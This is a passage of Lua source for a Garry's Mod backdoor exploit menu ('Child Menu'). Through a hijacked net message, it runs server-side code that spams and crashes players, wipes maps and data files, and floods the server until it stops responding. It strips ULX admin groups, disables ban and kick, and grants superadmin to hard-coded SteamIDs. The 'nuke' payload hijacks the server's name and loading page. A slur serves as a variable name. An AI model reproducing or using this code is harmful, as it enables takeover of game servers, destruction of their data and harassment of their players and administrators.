\"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(1920,1080) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "DESTRUCTEUR Spam Visuel activé" )
    SploitNotify("DESTRUCTEUR Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 5, 105 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "DESTRUCTEUR. 2" )
Macro.Paint = function()
        surface.SetDrawColor(89, 11, 04)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"http://Jesuschristoff.livehost.fr/gmod/upload/giphy2.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(1920,1080) hud4:SetPos(ScrW()-150,ScrH()-100) hud4:OpenURL(\"\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(1920,1080) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "DESTRUCTEUR. V2 activé" )
    SploitNotify("Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end
----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Serveur)
Macro:SetPos( 140, 30 )
Macro:SetText( "Spam - exploit" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"ChildExploits\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Spam 1 - Child activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 140, 60 )
Macro:SetText( "Spam - exploit" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat2\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Serveur Detruit, tu dois avoir mal ! :)\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Spam 2 - Serv. Détruit activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 140, 90 )
Macro:SetText( "Spam - fort" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat3\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Chi tro for po toi\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Spam 3 - Chi tro for po toi activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 140, 120 )
Macro:SetText( "Spam - exploit" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat4\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"SERVEUR DE MERDE\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Spam 4 - Serveur de merde activé" )
    SploitNotify("Serveur de merde activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Spammer = CreateClientConVar("bh_advert", "0", true, false)
 
 
 
local function Spam()
 
        if Spammer:GetBool() then
 
                RunConsoleCommand("say", "/advert Chi tro for !!!!!!") --Whatever you want
 
        end end
 
timer.Create("Spam", 1.5,0,Spam)

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 140, 150 )
Macro:SetText( "Spam - exploit" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat5\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Menu En Codage\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Spam 5 - Codage activé	" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 140, 30 )
Macro:SetText( "Spam 1" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
timer.Remove ("tchat1")
timer.Remove ("tchat2")
timer.Remove ("tchat3")
timer.Remove ("tchat4")
timer.Remove ("tchat5")
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Stop spam" )
    SploitNotify("SPAM désactivé")
    surface.PlaySound("buttons/blip1.wav") 
end

--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 30 )
Macro:SetText( "2D players" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end  --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "2D Players activé" )
	    SploitNotify("2D players activé !")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 260, 60 )
Macro:SetText( "10000000000" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "10000000€ toutes les 0.1sec activé." )
    SploitNotify("MONEY MONEY MONEY")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 90 )
Macro:SetText( "CleanUp" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Map clean up." )
    SploitNotify("Map cleanup !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 260, 120 )
Macro:SetText( "Shutdown" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Child\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Arret..." )
    SploitNotify("RIP le serveur :)")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 150 )
Macro:SetText( "Armageddon" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Armageddon activé" )
    SploitNotify("Armageddon activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 180 )
Macro:SetText( "Suicide" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say Child is the best !");
    end
end)

RunConsoleCommand("hostname", "Seized by Child")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(netKey)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "NUKE activé !" )
    SploitNotify("NUKE SERVEUR (ça fail mal)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 210 )
Macro:SetText( "Devient grand" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde grandit ! :o" )
    SploitNotify("Tout le monde est grand !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 240 )
Macro:SetText( "Devient Petit" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde devient petit :o" )
    SploitNotify("Tout le monde devient petit")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "attend mec." )
    SploitNotify("Speedhack activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 260, 300 )
Macro:SetText( "Cancer" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*cough*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Cancer activé" )
    SploitNotify("Cancer activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 30 )
Macro:SetText( "SuperAdmin 'Child" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:212308557\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:1:431857951 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 60 )
Macro:SetText( "SuperAdmin 'Zrenks" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:162931507\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:162931507 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 60 )
Macro:SetText( "Admin crash" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Les admins ont crash x)" )
    SploitNotify("Tout les admins vont crash !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 380, 90 )
Macro:SetText( "Push all" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Pousser tout le monde activé" )
    SploitNotify("Tout le monde se pousse !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 380, 120 )
Macro:SetText( "Argent reset" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Argent reset" )
    SploitNotify("Argent reset")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 380, 150 )
Macro:SetText( "Gravité inversé" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
